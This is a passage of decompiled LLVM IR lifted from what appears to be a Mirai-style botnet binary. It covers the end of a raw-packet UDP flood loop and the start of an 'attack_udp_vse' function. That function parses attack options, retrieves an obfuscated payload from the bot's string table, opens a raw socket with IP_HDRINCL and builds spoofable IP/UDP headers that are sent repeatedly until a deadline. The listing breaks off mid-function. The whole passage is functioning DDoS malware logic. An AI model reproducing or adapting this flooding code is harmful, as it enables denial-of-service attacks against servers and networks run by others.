dec_label_pc_cfec:                                ; preds = %dec_label_pc_cfe0, %dec_label_pc_d138, %dec_label_pc_d14c
  %v2_cff0 = load i32, i32* @r5, align 4
  %v3_cff0 = add i32 %v2_cff0, 10
  %v4_cff0 = inttoptr i32 %v3_cff0 to i16*
  store i16 0, i16* %v4_cff0, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_cff8 = load i32, i32* @r5, align 4
  store i32 %v0_cff8, i32* @r0, align 4
  %v2_cffc = call i32 @checksum_generic(i32 %v0_cff8, i32 20)
  %v3_cffc = trunc i32 %v2_cffc to i16
  store i32 %v2_cffc, i32* %r0.global-to-local, align 4
  %v3_d000 = load i32, i32* @r5, align 4
  %v4_d000 = add i32 %v3_d000, 10
  %v5_d000 = inttoptr i32 %v4_d000 to i16*
  store i16 %v3_cffc, i16* %v5_d000, align 2
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_d008 = load i32, i32* @r6, align 4
  %v3_d008 = add i32 %v2_d008, 6
  %v4_d008 = inttoptr i32 %v3_d008 to i16*
  store i16 0, i16* %v4_d008, align 2
  %v0_d00c = load i32, i32* @r6, align 4
  %v1_d00c = add i32 %v0_d00c, 4
  %v2_d00c = inttoptr i32 %v1_d00c to i16*
  %v3_d00c = load i16, i16* %v2_d00c, align 2
  %v4_d00c = zext i16 %v3_d00c to i32
  store i32 %v4_d00c, i32* %r2.global-to-local, align 4
  store i32 %v0_d00c, i32* @r1, align 4
  %v0_d014 = load i32, i32* @sl, align 4
  store i32 %v0_d014, i32* %r3.global-to-local, align 4
  %v0_d018 = load i32, i32* @r5, align 4
  store i32 %v0_d018, i32* %r0.global-to-local, align 4
  %v4_d01c = call i32 @checksum_tcpudp(i32 %v0_d018, i32 %v0_d00c, i32 %v4_d00c, i32 %v0_d014)
  %v5_d01c = trunc i32 %v4_d01c to i16
  store i32 %v4_d01c, i32* %r0.global-to-local, align 4
  %v3_d020 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d020, i32* %r3.global-to-local, align 4
  %v3_d024 = mul i32 %v3_d020, 32
  store i32 %v3_d024, i32* %lr.global-to-local, align 4
  %v3_d028 = load i32, i32* @r6, align 4
  %v4_d028 = add i32 %v3_d028, 6
  %v5_d028 = inttoptr i32 %v4_d028 to i16*
  store i16 %v5_d01c, i16* %v5_d028, align 2
  %v0_d02c = load i32, i32* %lr.global-to-local, align 4
  %v1_d02c = load i32, i32* %r3.global-to-local, align 4
  %tmp53 = mul i32 %v1_d02c, -8
  %v5_d02c = add i32 %v0_d02c, %tmp53
  store i32 %v5_d02c, i32* %lr.global-to-local, align 4
  %v0_d030 = load i32, i32* @r6, align 4
  %v1_d030 = add i32 %v0_d030, 2
  %v2_d030 = inttoptr i32 %v1_d030 to i16*
  %v3_d030 = load i16, i16* %v2_d030, align 2
  %v4_d030 = zext i16 %v3_d030 to i32
  store i32 %v4_d030, i32* @r6, align 4
  %v1_d034 = load i32, i32* @r7, align 4
  %v2_d034 = add i32 %v1_d034, %v5_d02c
  store i32 %v2_d034, i32* @lr, align 4
  %v3_d038 = add i32 %v2_d034, 2
  %v4_d038 = inttoptr i32 %v3_d038 to i16*
  store i16 %v3_d030, i16* %v4_d038, align 2
  %v0_d03c = load i32, i32* @r8, align 4
  store i32 %v0_d03c, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_d048 = load i32, i32* @r5, align 4
  store i32 %v0_d048, i32* %r1.global-to-local, align 4
  %v0_d04c = load i32, i32* @fp, align 4
  store i32 %v0_d04c, i32* %r0.global-to-local, align 4
  %v0_d050 = load i32, i32* @lr, align 4
  %v6_d058 = call i32 @__libc_sendto(i32 %v0_d04c, i32 %v0_d048, i32 %v0_d03c, i32 16384, i32 %v0_d050, i32 16)
  %v3_d05c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d05c, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v1_d064 = add i32 %v3_d05c, 1
  store i32 %v1_d064, i32* %r0.global-to-local, align 4
  store i32 %v1_d064, i32* %stack_var_-44, align 4
  %v6_d070 = icmp slt i32 %v1_d064, %arg2
  br i1 %v6_d070, label %dec_label_pc_d074, label %dec_label_pc_d218

dec_label_pc_d074:                                ; preds = %dec_label_pc_cfec, %dec_label_pc_cf98
  %v1_d088 = phi i32 [ %v1_d064, %dec_label_pc_cfec ], [ 0, %dec_label_pc_cf98 ]
  %v5_d078 = mul i32 %v1_d088, 24
  %v1_d080 = load i32, i32* @r7, align 4
  %v2_d080 = add i32 %v1_d080, %v5_d078
  store i32 %v2_d080, i32* %r3.global-to-local, align 4
  %v1_d084 = add i32 %v2_d080, 20
  %v2_d084 = inttoptr i32 %v1_d084 to i8*
  %v3_d084 = load i8, i8* %v2_d084, align 1
  %v4_d084 = zext i8 %v3_d084 to i32
  store i32 %v4_d084, i32* %r2.global-to-local, align 4
  %v4_d088 = mul i32 %v1_d088, 4
  %v5_d088 = add i32 %v4_d088, %v2_cca8
  %v6_d088 = inttoptr i32 %v5_d088 to i32*
  %v7_d088 = load i32, i32* %v6_d088, align 4
  store i32 %v7_d088, i32* @r5, align 4
  %v1_d090 = add i32 %v7_d088, 20
  store i32 %v1_d090, i32* @r6, align 4
  %tmp54 = icmp ugt i8 %v3_d084, 31
  br i1 %tmp54, label %dec_label_pc_cfac, label %dec_label_pc_d098

dec_label_pc_d098:                                ; preds = %dec_label_pc_d074
  %v1_d098 = add i32 %v2_d080, 16
  %v2_d098 = inttoptr i32 %v1_d098 to i32*
  %v3_d098 = load i32, i32* %v2_d098, align 4
  %v0_d09c = call i32 @rand_next()
  store i32 %v0_d09c, i32* %r0.global-to-local, align 4
  %v3_d0a0 = load i32, i32* %stack_var_-44, align 4
  %v5_d0a8 = mul i32 %v3_d0a0, 24
  %v1_d0ac = and i32 %v3_d098, 16711680
  store i32 %v1_d0ac, i32* %ip.global-to-local, align 4
  %v3_d0b0 = udiv i32 %v3_d098, 16777216
  %v4_d0b4 = udiv i32 %v1_d0ac, 256
  %v5_d0b4 = or i32 %v4_d0b4, %v3_d0b0
  store i32 %v5_d0b4, i32* %r2.global-to-local, align 4
  %v1_d0b8 = load i32, i32* @r7, align 4
  %v2_d0b8 = add i32 %v1_d0b8, %v5_d0a8
  store i32 %v2_d0b8, i32* %r1.global-to-local, align 4
  %v1_d0bc = and i32 %v3_d098, 65280
  store i32 %v1_d0bc, i32* %r3.global-to-local, align 4
  %v1_d0c0 = add i32 %v2_d0b8, 20
  %v2_d0c0 = inttoptr i32 %v1_d0c0 to i8*
  %v3_d0c0 = load i8, i8* %v2_d0c0, align 1
  %v4_d0c0 = zext i8 %v3_d0c0 to i32
  store i32 %v4_d0c0, i32* %ip.global-to-local, align 4
  %v5_d0c8 = call i32 @llvm.bswap.i32(i32 %v3_d098)
  %v7_d0cc = lshr i32 %v0_d09c, %v4_d0c0
  %v8_d0cc = add i32 %v7_d0cc, %v5_d0c8
  store i32 %v8_d0cc, i32* %r2.global-to-local, align 4
  %v1_d0d0 = and i32 %v8_d0cc, 16711680
  store i32 %v1_d0d0, i32* %r0.global-to-local, align 4
  %v1_d0dc = and i32 %v8_d0cc, 65280
  store i32 %v1_d0dc, i32* %r1.global-to-local, align 4
  %v5_d0e4 = call i32 @llvm.bswap.i32(i32 %v8_d0cc)
  store i32 %v5_d0e4, i32* %r3.global-to-local, align 4
  %v0_d0e8 = load i32, i32* @sb, align 4
  %v3_d0e8 = icmp eq i32 %v0_d0e8, -1
  %v1_d0ec = load i32, i32* @r5, align 4
  %v2_d0ec = add i32 %v1_d0ec, 16
  %v3_d0ec = inttoptr i32 %v2_d0ec to i32*
  store i32 %v5_d0e4, i32* %v3_d0ec, align 4
  br i1 %v3_d0e8, label %dec_label_pc_d0f4, label %dec_label_pc_cfb4

dec_label_pc_d0f4:                                ; preds = %dec_label_pc_d098, %dec_label_pc_cfac
  %v0_d0f4 = call i32 @rand_next()
  store i32 %v0_d0f4, i32* %r0.global-to-local, align 4
  store i32 %v3_ce44, i32* %ip.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  %v1_d108 = load i32, i32* @r5, align 4
  %v2_d108 = add i32 %v1_d108, 12
  %v3_d108 = inttoptr i32 %v2_d108 to i32*
  store i32 %v0_d0f4, i32* %v3_d108, align 4
  br i1 %v3_d104, label %dec_label_pc_d110, label %dec_label_pc_d0f4.dec_label_pc_cfc8_crit_edge

dec_label_pc_d0f4.dec_label_pc_cfc8_crit_edge:    ; preds = %dec_label_pc_d0f4
  %v1_cfcc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_cfc8

dec_label_pc_d110:                                ; preds = %dec_label_pc_d0f4, %dec_label_pc_cfb4
  %v0_d110 = call i32 @rand_next()
  %v1_d110 = trunc i32 %v0_d110 to i16
  %v3_d114 = load i32, i32* @r5, align 4
  %v4_d114 = add i32 %v3_d114, 4
  %v5_d114 = inttoptr i32 %v4_d114 to i16*
  store i16 %v1_d110, i16* %v5_d114, align 2
  store i32 %v3_ce48, i32* %r0.global-to-local, align 4
  %v1_d11c = load i32, i32* @r4, align 4
  %v9_d11c = icmp eq i32 %v3_ce48, %v1_d11c
  br i1 %v9_d11c, label %dec_label_pc_d124, label %dec_label_pc_cfd4

dec_label_pc_d124:                                ; preds = %dec_label_pc_d110, %dec_label_pc_cfc8
  %v0_d124 = call i32 @rand_next()
  %v1_d124 = trunc i32 %v0_d124 to i16
  store i32 %v0_d124, i32* %r0.global-to-local, align 4
  store i32 %v3_ce4c, i32* %r1.global-to-local, align 4
  %v1_d12c = load i32, i32* @r4, align 4
  %v9_d12c = icmp eq i32 %v3_ce4c, %v1_d12c
  %v3_d130 = load i32, i32* @r5, align 4
  %v4_d130 = add i32 %v3_d130, 20
  %v5_d130 = inttoptr i32 %v4_d130 to i16*
  store i16 %v1_d124, i16* %v5_d130, align 2
  br i1 %v9_d12c, label %dec_label_pc_d138, label %dec_label_pc_cfe0

dec_label_pc_d138:                                ; preds = %dec_label_pc_d124, %dec_label_pc_cfd4
  %v0_d138 = call i32 @rand_next()
  %v1_d138 = trunc i32 %v0_d138 to i16
  store i32 %v0_d138, i32* %r0.global-to-local, align 4
  store i32 %v1_cd9c, i32* %r2.global-to-local, align 4
  %v3_d144 = load i32, i32* @r6, align 4
  %v4_d144 = add i32 %v3_d144, 2
  %v5_d144 = inttoptr i32 %v4_d144 to i16*
  store i16 %v1_d138, i16* %v5_d144, align 2
  br i1 %v2_d140, label %dec_label_pc_cfec, label %dec_label_pc_d14c

dec_label_pc_d14c:                                ; preds = %dec_label_pc_cfe0, %dec_label_pc_d138
  %v0_d14c = load i32, i32* @r5, align 4
  %v1_d14c = add i32 %v0_d14c, 28
  store i32 %v1_d14c, i32* @r4, align 4
  store i32 %v1_d14c, i32* %r0.global-to-local, align 4
  store i32 %v0_ce28, i32* %r1.global-to-local, align 4
  %v2_d158 = call i32 @rand_alphastr(i32 %v1_d14c, i32 %v0_ce28)
  store i32 %v2_d158, i32* %r0.global-to-local, align 4
  store i32 %v0_ce28, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_d164 = load i32, i32* @r4, align 4
  %v4_d164 = add i32 %v3_d164, %v0_ce28
  %v5_d164 = inttoptr i32 %v4_d164 to i8*
  store i8 0, i8* %v5_d164, align 1
  br label %dec_label_pc_cfec

dec_label_pc_d16c:                                ; preds = %dec_label_pc_d16c.preheader, %dec_label_pc_d16c
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_d178 = call i32 @calloc(i32 1510, i32 1)
  store i32 %v2_d178, i32* %r0.global-to-local, align 4
  store i32 %v2_cca8, i32* %ip.global-to-local, align 4
  %v3_d180 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d180, i32* %r1.global-to-local, align 4
  %v2_d184 = load i32, i32* @r4, align 4
  %v5_d184 = mul i32 %v2_d184, 4
  %v6_d184 = add i32 %v5_d184, %v2_cca8
  %v7_d184 = inttoptr i32 %v6_d184 to i32*
  store i32 %v2_d178, i32* %v7_d184, align 4
  %v0_d188 = load i32, i32* %ip.global-to-local, align 4
  %v1_d188 = load i32, i32* %r1.global-to-local, align 4
  %v4_d188 = mul i32 %v1_d188, 4
  %v5_d188 = add i32 %v4_d188, %v0_d188
  %v6_d188 = inttoptr i32 %v5_d188 to i32*
  %v7_d188 = load i32, i32* %v6_d188, align 4
  store i32 %v7_d188, i32* %r3.global-to-local, align 4
  %v1_d18c = inttoptr i32 %v7_d188 to i8*
  %v2_d18c = load i8, i8* %v1_d18c, align 1
  %tmp55 = urem i8 %v2_d18c, 16
  %v1_d190 = zext i8 %tmp55 to i32
  %v1_d194 = or i32 %v1_d190, 64
  store i32 %v1_d194, i32* %r2.global-to-local, align 4
  %v1_d198 = trunc i32 %v1_d194 to i8
  store i8 %v1_d198, i8* %v1_d18c, align 1
  %v0_d19c = load i32, i32* %r3.global-to-local, align 4
  %v1_d19c = inttoptr i32 %v0_d19c to i8*
  %v2_d19c = load i8, i8* %v1_d19c, align 1
  %v1_d1a0 = and i8 %v2_d19c, -16
  %v1_d1a4 = or i8 %v1_d1a0, 5
  store i32 17, i32* %ip.global-to-local, align 4
  store i8 %v1_d1a4, i8* %v1_d19c, align 1
  %v0_d1b0 = load i32, i32* %ip.global-to-local, align 4
  %v1_d1b0 = trunc i32 %v0_d1b0 to i8
  %v2_d1b0 = load i32, i32* %r3.global-to-local, align 4
  %v3_d1b0 = add i32 %v2_d1b0, 9
  %v4_d1b0 = inttoptr i32 %v3_d1b0 to i8*
  store i8 %v1_d1b0, i8* %v4_d1b0, align 1
  %v2_d1b8 = load i32, i32* %r3.global-to-local, align 4
  %v3_d1b8 = add i32 %v2_d1b8, 1
  %v4_d1b8 = inttoptr i32 %v3_d1b8 to i8*
  store i8 %v5_cce0, i8* %v4_d1b8, align 1
  store i32 %v4_d1bc, i32* %ip.global-to-local, align 4
  %v0_d1c0 = load i32, i32* %r1.global-to-local, align 4
  %v3_d1c0 = mul i32 %v0_d1c0, 32
  store i32 %v3_d1c0, i32* %r0.global-to-local, align 4
  %v2_d1c4 = load i32, i32* %r3.global-to-local, align 4
  %v3_d1c4 = add i32 %v2_d1c4, 8
  %v4_d1c4 = inttoptr i32 %v3_d1c4 to i8*
  store i8 %v5_cd18, i8* %v4_d1c4, align 1
  %v0_d1c8 = load i32, i32* @sb, align 4
  %v1_d1c8 = load i32, i32* %r3.global-to-local, align 4
  %v2_d1c8 = add i32 %v1_d1c8, 12
  %v3_d1c8 = inttoptr i32 %v2_d1c8 to i32*
  store i32 %v0_d1c8, i32* %v3_d1c8, align 4
  %v0_d1cc = load i32, i32* %r0.global-to-local, align 4
  %v1_d1cc = load i32, i32* %r1.global-to-local, align 4
  %tmp56 = mul i32 %v1_d1cc, -8
  %v5_d1cc = add i32 %v0_d1cc, %tmp56
  %v1_d1d0 = load i32, i32* @r7, align 4
  %v2_d1d0 = add i32 %v5_d1cc, %v1_d1d0
  store i32 %v2_d1d0, i32* %r2.global-to-local, align 4
  %v1_d1d4 = add i32 %v2_d1d0, 16
  %v2_d1d4 = inttoptr i32 %v1_d1d4 to i32*
  %v3_d1d4 = load i32, i32* %v2_d1d4, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v1_d1dc = load i32, i32* %r3.global-to-local, align 4
  %v2_d1dc = add i32 %v1_d1dc, 16
  %v3_d1dc = inttoptr i32 %v2_d1dc to i32*
  store i32 %v3_d1d4, i32* %v3_d1dc, align 4
  store i32 64, i32* %r2.global-to-local, align 4
  %v0_d1e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_d1e4 = add i32 %v0_d1e4, 1
  store i32 %v1_d1e4, i32* @r4, align 4
  %v0_d1e8 = load i32, i32* @r6, align 4
  %v1_d1e8 = trunc i32 %v0_d1e8 to i16
  %v2_d1e8 = load i32, i32* %r3.global-to-local, align 4
  %v3_d1e8 = add i32 %v2_d1e8, 2
  %v4_d1e8 = inttoptr i32 %v3_d1e8 to i16*
  store i16 %v1_d1e8, i16* %v4_d1e8, align 2
  %v0_d1ec = load i32, i32* %r3.global-to-local, align 4
  %v1_d1ec = add i32 %v0_d1ec, 20
  store i32 %v1_d1ec, i32* %r1.global-to-local, align 4
  %v0_d1f0 = load i32, i32* @r8, align 4
  %v1_d1f0 = trunc i32 %v0_d1f0 to i16
  %v3_d1f0 = add i32 %v0_d1ec, 4
  %v4_d1f0 = inttoptr i32 %v3_d1f0 to i16*
  store i16 %v1_d1f0, i16* %v4_d1f0, align 2
  %v0_d1f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_d1f4 = trunc i32 %v0_d1f4 to i16
  %v2_d1f4 = load i32, i32* %r3.global-to-local, align 4
  %v3_d1f4 = add i32 %v2_d1f4, 6
  %v4_d1f4 = inttoptr i32 %v3_d1f4 to i16*
  store i16 %v1_d1f4, i16* %v4_d1f4, align 2
  %v0_d1f8 = load i32, i32* @sl, align 4
  %v1_d1f8 = trunc i32 %v0_d1f8 to i16
  %v2_d1f8 = load i32, i32* %r3.global-to-local, align 4
  %v3_d1f8 = add i32 %v2_d1f8, 20
  %v4_d1f8 = inttoptr i32 %v3_d1f8 to i16*
  store i16 %v1_d1f8, i16* %v4_d1f8, align 2
  store i32 %v4_d1fc, i32* %r3.global-to-local, align 4
  %v0_d200 = load i32, i32* @r4, align 4
  %v1_d200 = load i32, i32* %r0.global-to-local, align 4
  %v0_d204 = load i32, i32* @r5, align 4
  %v1_d204 = trunc i32 %v0_d204 to i16
  %v2_d204 = load i32, i32* %r1.global-to-local, align 4
  %v3_d204 = add i32 %v2_d204, 4
  %v4_d204 = inttoptr i32 %v3_d204 to i16*
  store i16 %v1_d204, i16* %v4_d204, align 2
  %v0_d208 = load i32, i32* %r3.global-to-local, align 4
  %v1_d208 = trunc i32 %v0_d208 to i16
  %v2_d208 = load i32, i32* %r1.global-to-local, align 4
  %v3_d208 = add i32 %v2_d208, 2
  %v4_d208 = inttoptr i32 %v3_d208 to i16*
  store i16 %v1_d208, i16* %v4_d208, align 2
  %v0_d20c = load i32, i32* @r4, align 4
  store i32 %v0_d20c, i32* %stack_var_-44, align 4
  %v5_d210 = icmp slt i32 %v0_d200, %v1_d200
  br i1 %v5_d210, label %dec_label_pc_d16c, label %dec_label_pc_cf84.preheader

dec_label_pc_d218:                                ; preds = %dec_label_pc_cfec, %dec_label_pc_cf84
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_d21c = call i32 @__GI_time(i32* null)
  store i32 %v2_d21c, i32* %r0.global-to-local, align 4
  store i32 %v2_cdc0, i32* %r3.global-to-local, align 4
  %v6_d228 = icmp slt i32 %v2_cdc0, %v2_d21c
  br i1 %v6_d228, label %dec_label_pc_d22c, label %dec_label_pc_cf84

dec_label_pc_d22c:                                ; preds = %dec_label_pc_d218, %entry, %dec_label_pc_d238
  %v1_d234 = phi i32 [ %v3_cdd4, %entry ], [ %v1_d23c, %dec_label_pc_d238 ], [ %v2_d21c, %dec_label_pc_d218 ]
  store i32 %v27_cc7c, i32* %lr.global-to-local, align 4
  ret i32 %v1_d234

dec_label_pc_d238:                                ; preds = %dec_label_pc_cde4
  %v0_d238 = load i32, i32* @fp, align 4
  store i32 %v0_d238, i32* %r0.global-to-local, align 4
  %v1_d23c = call i32 @__GI___libc_close(i32 %v0_d238)
  store i32 %v1_d23c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d22c

; uselistorder directives
  uselistorder i32 %v1_d23c, { 1, 0 }
  uselistorder i32 %v0_d138, { 1, 0 }
  uselistorder i32 %v0_d124, { 1, 0 }
  uselistorder i32 %v1_d11c, { 1, 0 }
  uselistorder i32 %v5_d0e4, { 1, 0 }
  uselistorder i32 %v3_d098, { 2, 1, 3, 0 }
  uselistorder i32 %v1_d064, { 1, 2, 0, 3 }
  uselistorder i32 %v5_d02c, { 1, 0 }
  uselistorder i32 %v4_d01c, { 1, 0 }
  uselistorder i32 %v0_d00c, { 1, 0, 2 }
  uselistorder i32 %v2_cffc, { 1, 0 }
  uselistorder i1 %v2_d140, { 1, 0 }
  uselistorder i32 %v1_cf44, { 1, 0 }
  uselistorder i16 %v5_ced4, { 1, 0 }
  uselistorder i32 %v3_cec0, { 1, 0 }
  uselistorder i32 %v3_cebc, { 1, 0 }
  uselistorder i32 %v3_ceb8, { 1, 0 }
  uselistorder i32 %v1_ce78, { 2, 3, 1, 0 }
  uselistorder i32 %v1_ce74, { 3, 4, 2, 0, 1 }
  uselistorder i32 %v3_ce48, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %v3_ce3c, { 1, 0 }
  uselistorder i32 %v0_ce28, { 0, 4, 5, 6, 3, 7, 8, 1, 2 }
  uselistorder i32 %v3_cdd4, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_cdc0, { 1, 0 }
  uselistorder i32 %v1_cd9c, { 2, 1, 3, 0 }
  uselistorder i32 %v6_cd5c, { 1, 0, 3, 2 }
  uselistorder i32 %v1_cd28, { 1, 0 }
  uselistorder i8 %v5_cd18, { 1, 0, 2 }
  uselistorder i32 %v6_ccfc, { 1, 0 }
  uselistorder i32 %v7_cce4, { 1, 0, 2 }
  uselistorder i32 %v6_ccc0, { 1, 0 }
  uselistorder i32 %v2_cca8, { 0, 3, 1, 2, 4 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 12, 10, 11 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 23, 18, 19, 20, 21, 22, 24, 25, 26, 27, 28, 33, 29, 30, 31, 32, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 13, 9, 10, 11, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0, 23, 24, 25, 27, 26, 28, 29, 30, 31, 32, 33, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 7, 5, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 36, 35, 38, 37, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 8, 3, 4, 5, 6, 7, 10, 9, 12, 11, 14, 15, 13, 17, 16, 19, 18, 20, 22, 21, 29, 23, 24, 25, 26, 27, 28, 33, 30, 31, 32, 34, 36, 35, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 0 }
  uselistorder i32 %arg2, { 2, 5, 4, 6, 0, 3, 1, 7, 8, 9, 10 }
  uselistorder label %dec_label_pc_d22c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_d16c, { 1, 0 }
  uselistorder label %dec_label_pc_d14c, { 1, 0 }
  uselistorder label %dec_label_pc_cfec, { 2, 1, 0 }
  uselistorder label %dec_label_pc_cf84, { 1, 0 }
  uselistorder label %dec_label_pc_cee0, { 1, 0 }
  uselistorder label %bb40, { 1, 0 }
}

define i32 @attack_udp_vse(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v3_d248 = load i32, i32* @r4, align 4
  %v27_d248 = load i32, i32* @lr, align 4
  store i32 0, i32* @r7, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg2, i32* @fp, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg5, i32* @r4, align 4
  store i32 %arg3, i32* @r8, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_d274 = call i32 @calloc(i32 %arg2, i32 4)
  %v0_d278 = load i32, i32* @r4, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_d280 = load i32, i32* @r7, align 4
  store i32 %v0_d280, i32* %r3.global-to-local, align 4
  store i32 %v2_d274, i32* @sb, align 4
  %v0_d288 = load i32, i32* @r5, align 4
  %v4_d28c = inttoptr i32 %v0_d278 to i32*
  %v5_d28c = call i32 @attack_get_opt_int(i32 %v0_d288, i32* %v4_d28c, i32 2, i32 %v0_d280)
  %v1_d298 = urem i32 %v5_d28c, 256
  store i32 %v1_d298, i32* %ip.global-to-local, align 4
  %v0_d29c = load i32, i32* @r4, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_d2a8 = load i32, i32* @r5, align 4
  %v5_d2ac = trunc i32 %v5_d28c to i8
  %v6_d2b0 = inttoptr i32 %v0_d29c to i32*
  %v7_d2b0 = call i32 @attack_get_opt_int(i32 %v0_d2a8, i32* %v6_d2b0, i32 3, i32 65535)
  %v0_d2b4 = load i32, i32* @r4, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_d2c4 = load i32, i32* @r5, align 4
  %v5_d2c8 = inttoptr i32 %v0_d2b4 to i32*
  %v6_d2c8 = call i32 @attack_get_opt_int(i32 %v0_d2c4, i32* %v5_d2c8, i32 4, i32 64)
  %v0_d2d0 = load i32, i32* @r4, align 4
  %v1_d2d4 = urem i32 %v6_d2c8, 256
  store i32 %v1_d2d4, i32* %ip.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v0_d2dc = load i32, i32* @r7, align 4
  store i32 %v0_d2dc, i32* %r3.global-to-local, align 4
  %v0_d2e0 = load i32, i32* @r5, align 4
  %v6_d2e8 = inttoptr i32 %v0_d2d0 to i32*
  %v7_d2e8 = call i32 @attack_get_opt_int(i32 %v0_d2e0, i32* %v6_d2e8, i32 5, i32 %v0_d2dc)
  %v1_d2f4 = urem i32 %v7_d2e8, 256
  store i32 %v1_d2f4, i32* %ip.global-to-local, align 4
  %v0_d2f8 = load i32, i32* @r4, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_d304 = load i32, i32* @r5, align 4
  %v5_d30c = inttoptr i32 %v0_d2f8 to i32*
  %v6_d30c = call i32 @attack_get_opt_int(i32 %v0_d304, i32* %v5_d30c, i32 6, i32 65535)
  %v0_d314 = load i32, i32* @r4, align 4
  store i32 27015, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_d324 = load i32, i32* @r5, align 4
  %v5_d328 = inttoptr i32 %v0_d314 to i32*
  %v6_d328 = call i32 @attack_get_opt_int(i32 %v0_d324, i32* %v5_d328, i32 7, i32 27015)
  store i32 %v6_d328, i32* @r4, align 4
  %v0_d330 = load i32, i32* @r7, align 4
  store i32 %v0_d330, i32* %stack_var_-48, align 4
  %v1_d338 = inttoptr i32 %v0_d330 to i32*
  %v2_d338 = call i32 @__GI_time(i32* %v1_d338)
  %v1_d33c = load i32, i32* @r6, align 4
  %v2_d33c = add i32 %v1_d33c, %v2_d338
  %v1_d348 = call i32 @table_unlock_val(i32 32)
  %v3_d354 = call i32 @table_retrieve_val(i32 32, i32* nonnull %stack_var_-48)
  store i32 17, i32* %r2.global-to-local, align 4
  %v3_d368 = call i32 @socket(i32 2, i32 3, i32 17)
  %v7_d36c = icmp eq i32 %v3_d368, -1
  store i32 %v3_d368, i32* @sl, align 4
  br i1 %v7_d36c, label %dec_label_pc_d698, label %dec_label_pc_d378

dec_label_pc_d378:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_d380 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_d380, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_d388 = load i32, i32* @r7, align 4
  store i32 %v0_d388, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_d394 = call i32 @__GI_setsockopt(i32 %v3_d368, i32 %v0_d388, i32 3, i32 %v6_d380, i32 ptrtoint (i32* @0 to i32))
  %v7_d398 = icmp eq i32 %v5_d394, -1
  br i1 %v7_d398, label %dec_label_pc_d6a4, label %dec_label_pc_d3a0

dec_label_pc_d3a0:                                ; preds = %dec_label_pc_d378
  store i32 %v6_d30c, i32* %r2.global-to-local, align 4
  %v0_d3ac = load i32, i32* @r4, align 4
  %v3_d3b0 = mul i32 %v6_d30c, 65536
  store i32 %v3_d3b0, i32* %ip.global-to-local, align 4
  %v3_d3b4 = urem i32 %v7_d2b0, 65536
  store i32 %v3_d3b4, i32* %r3.global-to-local, align 4
  %v3_d3b8 = urem i32 %v6_d30c, 65536
  %v3_d3bc = urem i32 %v0_d3ac, 65536
  %v0_d3c0 = load i32, i32* @fp, align 4
  %v2_d3c0 = icmp eq i32 %v0_d3c0, 0
  %v0_d3c4 = load i32, i32* @r7, align 4
  store i32 %v0_d3c4, i32* %stack_var_-44, align 4
  br i1 %v2_d3c0, label %dec_label_pc_d504.preheader, label %dec_label_pc_d3d8

dec_label_pc_d3d8:                                ; preds = %dec_label_pc_d3a0
  %tmp39 = mul i32 %v7_d2b0, 256
  %v3_d3e0 = and i32 %tmp39, 65280
  store i32 %v3_d3e0, i32* %r3.global-to-local, align 4
  %tmp40 = mul i32 %v0_d3ac, 256
  %v3_d3e4 = and i32 %tmp40, 65280
